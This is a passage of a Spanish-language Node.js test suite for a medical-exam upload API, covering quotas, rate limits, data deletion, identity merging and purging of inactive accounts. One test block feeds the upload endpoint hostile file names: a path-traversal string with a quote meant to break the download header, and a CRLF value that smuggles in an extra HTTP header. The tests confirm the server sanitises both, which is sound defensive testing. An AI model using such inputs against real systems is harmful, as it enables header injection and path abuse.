    assert.equal(r.json.error, "cuota_excedida");
    assert.match(r.json.mensaje, /100 MB/);
    await admin().query("delete from examenes where uid = $1 and nombre_cifrado = 'v1.relleno'", [uid]);
  });

  test("límite de subidas por hora: agotado → 429", async () => {
    await admin().query(
      `insert into limites_tasa (clave, ventana, conteo)
       values ($1, to_timestamp(floor(extract(epoch from now()) / 3600) * 3600), 30)
       on conflict (clave, ventana) do update set conteo = 30`,
      [`examen:${uid}`]
    );
    const r = await subir(c, "otro.pdf", PDF_SIMPLE);
    assert.equal(r.status, 429);
    assert.equal(r.json.error, "demasiadas_peticiones");
    await admin().query("delete from limites_tasa where clave = $1", [`examen:${uid}`]);
  });
});

describe("E9 nombres hostiles", { skip: SALTEAR }, () => {
  test("rutas y comillas en el nombre: se guarda una sola componente y el header de descarga no se rompe", async () => {
    const r = await subir(a, '../../etc/resultado"; filename="malo.html.pdf', PDF_SIMPLE);
    assert.equal(r.status, 201, JSON.stringify(r.json));
    assert.ok(!r.json.examen.nombre.includes("/"), "sin carpetas");
    const d = await bajar(a, r.json.examen.id);
    const cd = d.res.headers.get("content-disposition");
    assert.equal(cd.match(/filename="/g).length, 1, cd);
    assert.match(cd, /^attachment; filename="[A-Za-z0-9 ._()-]+\.pdf"; filename\*=UTF-8''[A-Za-z0-9%._~!-]+$/);
  });

  test("nombre con tildes y saltos de línea codificados: se limpian", async () => {
    const r = await subir(a, "Glucosa\r\nX-Inyectado: 1 — señora Pérez.pdf", PDF_SIMPLE);
    assert.equal(r.status, 201, JSON.stringify(r.json));
    assert.equal(r.json.examen.nombre, "GlucosaX-Inyectado: 1 — señora Pérez.pdf");
    const d = await bajar(a, r.json.examen.id);
    assert.equal(d.res.headers.get("x-inyectado"), null);
    assert.match(d.res.headers.get("content-disposition"), /filename\*=UTF-8''Glucosa.*se%C3%B1ora%20P%C3%A9rez\.pdf$/);
  });

  test("sin X-Nombre-Archivo o con un escape inválido → 400 nombre_invalido", async () => {
    let r = await fetch(`${BASE}/api/examenes`, { method: "POST", headers: a.auth, body: PDF_SIMPLE });
    assert.equal(r.status, 400);
    assert.equal((await r.json()).error, "nombre_invalido");
    r = await fetch(`${BASE}/api/examenes`, { method: "POST", headers: { ...a.auth, "X-Nombre-Archivo": "%E0%A4%A.pdf" }, body: PDF_SIMPLE });
    assert.equal((await r.json()).error, "nombre_invalido");
  });
});

describe("E10 supresión y fusión", { skip: SIN_DISCO }, () => {
  test("Borrar mis datos (/api/mis-datos) borra los archivos de los exámenes", async () => {
    const d = await nuevaCuenta();
    const ids = [];
    for (const [n, bytes] of [["uno.pdf", PDF_SIMPLE], ["dos.png", PNG_REAL]]) {
      const r = await subir(d, n, bytes);
      assert.equal(r.status, 201);
      ids.push(r.json.examen.id);
    }
    const archivos = await Promise.all(ids.map(async (i) => (await filaDe(i)).archivo));
    assert.ok(archivos.every((x) => existsSync(archivoEnDisco(x))));

    const r = await fetch(`${BASE}/api/mis-datos`, { method: "DELETE", headers: d.auth });
    assert.equal(r.status, 200);
    for (const i of ids) assert.equal(await filaDe(i), undefined, "la fila se borró");
    for (const x of archivos) assert.equal(existsSync(archivoEnDisco(x)), false, "el archivo se borró");
  });

  test("fusión de identidad: los exámenes de la identidad que se suma pasan a la cuenta", async () => {
    // Una identidad sin cuenta con un examen (se mueve uno real de A con el dueño de la base).
    const anon = await nuevaSesion();
    const uidAnon = await uidDe(anon);
    const subido = await subir(a, "para-fusionar.pdf", PDF_SIMPLE);
    assert.equal(subido.status, 201);
    const id = subido.json.examen.id;
    await admin().query("update examenes set uid = $1 where id = $2", [uidAnon, id]);
    assert.equal((await bajar(a, id)).status, 404, "ya no es de A");

    await admin().query("select pulso_fusionar_identidad($1, $2)", [uidAnon, await uidDe(b)]);

    const { examenes } = await listar(b);
    assert.ok(examenes.some((e) => e.id === id && e.nombre === "para-fusionar.pdf"), "ahora es de B");
    const d = await bajar(b, id);
    assert.equal(d.status, 200);
    assert.equal(sha256(d.bytes), sha256(PDF_SIMPLE), "el archivo no se movió y se sigue descifrando");
    const { rowCount } = await admin().query("select 1 from identidades where uid = $1", [uidAnon]);
    assert.equal(rowCount, 0, "la identidad fusionada ya no existe");
  });
});

describe("E11 purga de inactivos", { skip: SIN_DISCO }, () => {
  const correr = (...args) =>
    promisify(execFile)(process.execPath, [path.join(RAIZ, "scripts/purgar-inactivos.mjs"), ...args], {
      env: { ...process.env, DATABASE_ADMIN_URL: ADMIN, MEDIA_DIR: MEDIA },
    });

  test("borra los archivos de las identidades purgadas y los huérfanos de más de una hora", async () => {
    const e = await nuevaCuenta();
    const r = await subir(e, "viejo.pdf", PDF_SIMPLE);
    assert.equal(r.status, 201);
    const { archivo } = await filaDe(r.json.examen.id);
    // Que la identidad sea purgable: sin cuenta activada y con la sesión vencida.
    const uid = await uidDe(e);
    await admin().query("update cuentas set verificada_at = null where uid = $1", [uid]);
    await admin().query("update sesiones set expira_at = now() - interval '1 minute' where uid = $1", [uid]);

    const huerfanoViejo = randomBytes(16).toString("hex");
    const huerfanoNuevo = randomBytes(16).toString("hex");
    await writeFile(archivoEnDisco(huerfanoViejo), randomBytes(64));
    await writeFile(archivoEnDisco(huerfanoNuevo), randomBytes(64));
    const hace2h = new Date(Date.now() - 2 * 3600 * 1000);
    await utimes(archivoEnDisco(huerfanoViejo), hace2h, hace2h);

    const seco = await correr("--dias", "0", "--seco");
    assert.match(seco.stdout, /\(seco\).*archivos de sus exámenes/);
    assert.ok(existsSync(archivoEnDisco(archivo)), "en seco no se borra nada");

    const { stdout } = await correr("--dias", "0");
    assert.match(stdout, /✓ \d+ identidades purgadas/);
    assert.equal(await filaDe(r.json.examen.id), undefined, "la fila se fue con la identidad");
    assert.equal(existsSync(archivoEnDisco(archivo)), false, "el archivo de la identidad purgada se borró");
    assert.equal(existsSync(archivoEnDisco(huerfanoViejo)), false, "el huérfano viejo se borró");
    assert.ok(existsSync(archivoEnDisco(huerfanoNuevo)), "el huérfano reciente (subida en curso) se respeta");
    await rm(archivoEnDisco(huerfanoNuevo), { force: true });
    creadas.splice(creadas.indexOf(e), 1);
  });

  test("los exámenes de las cuentas activas no se tocan", async () => {
    const { examenes } = await listar(a);
    assert.ok(examenes.length > 0);
    const d = await bajar(a, examenes[0].id);
    assert.equal(d.status, 200);
  });
});
